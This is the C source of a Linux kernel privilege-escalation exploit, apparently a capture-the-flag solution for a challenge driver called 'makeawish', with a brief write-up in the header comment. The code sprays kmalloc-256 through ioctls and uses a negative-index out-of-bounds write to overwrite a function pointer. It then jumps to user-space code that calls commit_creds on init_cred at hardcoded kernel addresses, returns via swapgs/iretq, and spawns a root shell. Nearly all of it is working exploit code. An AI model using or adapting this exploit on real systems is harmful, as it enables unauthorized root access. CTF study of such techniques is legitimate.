/*
Writeup:
Spray heap (kmalloc-256) and use negative index to modify the function pointer
(last 8 bytes of the object) No SMEP SMAP KPTI KASLR just ret2user to get root.
The flag is at /dev/sda
*/
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_ALLOC 0xC018CA00
#define CMD_EDIT 0xC018CA01
#define CMD_READ 0xC018CA02
#define CMD_EXEC 0xC018CA03

typedef struct {
  uint64_t index;
  int32_t offset;
  uint32_t pad;
  uint64_t user_ptr;
} request_t;

int fd;

void open_dev() {
  fd = open("/dev/makeawish", O_RDWR);
  if (fd < 0) {
    perror("[-] open");
    exit(1);
  }
  printf("[+] Device opened\n");
}

void make_wish(char *data) {
  request_t req = {0};
  req.user_ptr = (uint64_t)data;
  if (ioctl(fd, CMD_ALLOC, &req) < 0) {
    perror("[-] Alloc failed");
  }
}

void edit_wish(uint64_t idx, int32_t offset, char *byte_val_ptr) {
  request_t req = {0};
  req.index = idx;
  req.offset = offset;
  req.user_ptr = (uint64_t)byte_val_ptr;

  if (ioctl(fd, CMD_EDIT, &req) < 0) {
    perror("[-] Edit failed");
  }
}

void read_wish(uint64_t idx, char *buffer) {
  request_t req = {0};
  req.index = idx;
  req.user_ptr = (uint64_t)buffer;
  memset(buffer, 0, 256);
  if (ioctl(fd, CMD_READ, &req) < 0) {
    perror("[-] Read failed");
  }
}

void exec_wish(uint64_t idx) {
  request_t req = {0};
  req.index = idx;
  if (ioctl(fd, CMD_EXEC, &req) < 0) {
    perror("[-] Exec failed");
  }
}

void log_info(const char *format, ...) {
  va_list args;
  va_start(args, format);
  vfprintf(stdout, format, args);
  va_end(args);
  fflush(stdout);
}

void hexdump(unsigned char *buff, size_t size) {
  int i, j;

  for (i = 0; i < size / 8; i++) {
    if ((i % 2) == 0) {
      if (i != 0)
        printf("  \n");
      printf("  %04x  ", i * 8);
    }
    printf("0x%016lx", ((uint64_t *)(buff))[i]);
    printf("    ");
  }
  putchar('\n');
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
  log_info("[*] Saving state...\n");
  __asm__ __volatile__(".intel_syntax noprefix;"
                       "mov user_cs, cs;"
                       "mov user_ss, ss;"
                       "mov user_sp, rsp;"
                       "pushf;"
                       "pop user_rflags;"
                       ".att_syntax");
  log_info("[*] user_cs: %p\n", (void *)user_cs);
  log_info("[*] user_ss: %p\n", (void *)user_ss);
  log_info("[*] user_sp: %p\n", (void *)user_sp);
  log_info("[*] user_rflags: %p\n", (void *)user_rflags);
  log_info("[+] State saved\n");
}

void get_shell() {
  printf("vincent55nogg"); // here will segfault
}

uint64_t user_rip = (uint64_t)&get_shell;
void escalate_privs() {
  __asm__(".intel_syntax noprefix;"
          "xor rdi, rdi;"
          "movabs rcx, 0xffffffff8132b0f0;" // COMMIT_CREDS
          "movabs rax, 0xffffffff82c54da0;" // INIT_CRED
          "mov rdi, rax;"
          "call rcx;"

          "mov r15, user_ss;"
          "push r15;"
          "mov r15, user_sp;"
          "push r15;"
          "mov r15, user_rflags;"
          "push r15;"
          "mov r15, user_cs;"
          "push r15;"
          "mov r15, user_rip;"
          "push r15;"
          "swapgs;"
          "iretq;"
          ".att_syntax;");
}

static void handler(int signum) {
  // return to user land will segfault so pop shell in segfault handler...
  if (getuid() == 0) {
    log_info("[+] We are r00t!\n");
    system("/bin/sh");
  } else {
    log_info("[-] Failed to get root...\n");
    exit(1);
  }
}

int main() {
  log_info("--------------------------------\n");
  log_info("Hex Advent 2025: Make A Wish\n");
  log_info("--------------------------------\n");
  log_info("Author: pwn2ooown\n");
  log_info("--------------------------------\n");
  save_state();
  open_dev();
  signal(SIGSEGV, handler);
  char payload[256];
  memset(payload, 'A', 256);
  char leak_buf[256];
  memset(leak_buf, 0, 256);

  log_info("[*] Spraying heap...\n");
  for (int i = 0; i < 80; i++) {
    log_info("[*] Allocating index %d\r", i);
    payload[0] = i + 1;
    make_wish(payload);
  }
  log_info("[*] OOB Write to function pointer...\n");

  char target_byte = 'B';

  uint64_t target_addr = (uint64_t)&escalate_privs;
  log_info("[*] target_addr: %p\n", (void *)target_addr);
  char win_addr[8];
  memcpy(win_addr, &target_addr, 8);
  for (int j = 0; j < 80; j++) {
    for (int i = 0; i < 8; i++) {
      log_info("[*] Writing to index %d, offset %d\r", i, j);
      int offset = -8 + i;
      char aaa = win_addr[i];
      edit_wish(j, offset, &aaa);
    }
    edit_wish(j, -9, &target_byte);
  }
  int found = -1;
  log_info(
      "[*] Finding the target object with overwritten function pointer...\n");
  for (int i = 0; i < 80; i++) {
    read_wish(i, leak_buf);
    if (leak_buf[247] == target_byte) {
      log_info("[+] Found at index %d\n", i);
      found = i;
      break;
    }
  }
  if (found == -1) {
    log_info("[-] Failed to find the target\n");
    close(fd);
    return 1;
  }

  exec_wish(found);

  close(fd);
  return 0;
}